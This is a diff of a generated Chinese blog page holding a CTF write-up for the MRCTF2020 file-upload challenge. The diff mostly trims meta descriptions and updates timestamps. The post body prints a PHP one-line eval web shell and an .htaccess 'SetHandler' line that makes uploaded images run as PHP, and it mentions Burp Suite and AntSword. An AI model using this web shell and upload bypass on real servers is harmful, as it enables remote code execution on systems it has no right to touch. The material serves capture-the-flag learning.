@@ -24,12 +24,12 @@
     var CONFIG = {"hostname":"qnjy.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
 
-  <meta name="description" content="[MRCTF2020]你传你🐎呢解题思路首先，先上传一句话木马文件 123&lt;?php    @eval($_POST[&amp;#x27;123&amp;#x27;]);?&gt;  之后，使用burpsuite更改MIME类型和后缀名，网页显示返回路径，但是这时候用蚁剑并不能连接成功，这是因为上传的是jpg文件无法解析成php，所以这时候，我们要先上传.htaccess文件（可以将其他文件类型当做php">
+  <meta name="description" content="[MRCTF2020]你传你🐎呢解题思路首先，先上传一句话木马文件 123&lt;?php    @eval($_POST[&amp;#x27;123&amp;#x27;]);?&gt;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF_Web">
 <meta property="og:url" content="https://qnjy.github.io/post/282276cb.html">
 <meta property="og:site_name" content="qnjy&#39;s blog">
-<meta property="og:description" content="[MRCTF2020]你传你🐎呢解题思路首先，先上传一句话木马文件 123&lt;?php    @eval($_POST[&amp;#x27;123&amp;#x27;]);?&gt;  之后，使用burpsuite更改MIME类型和后缀名，网页显示返回路径，但是这时候用蚁剑并不能连接成功，这是因为上传的是jpg文件无法解析成php，所以这时候，我们要先上传.htaccess文件（可以将其他文件类型当做php">
+<meta property="og:description" content="[MRCTF2020]你传你🐎呢解题思路首先，先上传一句话木马文件 123&lt;?php    @eval($_POST[&amp;#x27;123&amp;#x27;]);?&gt;">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s3.ax1x.com/2021/03/16/6s9MsH.jpg">
 <meta property="og:image" content="https://s3.ax1x.com/2021/03/16/6s9nzD.jpg">
@@ -46,7 +46,7 @@
 <meta property="og:image" content="https://s3.ax1x.com/2021/03/16/6ysMhF.jpg">
 <meta property="og:image" content="https://s3.ax1x.com/2021/03/16/6yynKA.jpg">
 <meta property="article:published_time" content="2021-03-15T14:17:21.000Z">
-<meta property="article:modified_time" content="2021-03-28T23:58:47.945Z">
+<meta property="article:modified_time" content="2021-03-29T00:25:20.948Z">
 <meta property="article:author" content="qnjy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://s3.ax1x.com/2021/03/16/6s9MsH.jpg">
@@ -337,7 +337,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-03-29 07:58:47" itemprop="dateModified" datetime="2021-03-29T07:58:47+08:00">2021-03-29</time>
+        <time title="修改时间：2021-03-29 08:25:20" itemprop="dateModified" datetime="2021-03-29T08:25:20+08:00">2021-03-29</time>
       </span>
 
   
@@ -360,7 +360,8 @@
         <h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先，先上传一句话木马文件</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;123&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>之后，使用burpsuite更改MIME类型和后缀名，网页显示返回路径，但是这时候用蚁剑并不能连接成功，这是因为上传的是jpg文件无法解析成php，所以这时候，我们要先上传.htaccess文件（可以将其他文件类型当做php解析）。</p>
+<a id="more"></a>之后，使用burpsuite更改MIME类型和后缀名，网页显示返回路径，但是这时候用蚁剑并不能连接成功，这是因为上传的是jpg文件无法解析成php，所以这时候，我们要先上传.htaccess文件（可以将其他文件类型当做php解析）。
+
 <p>然后，新建名字为”.htaccess“的文件，内容：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
 
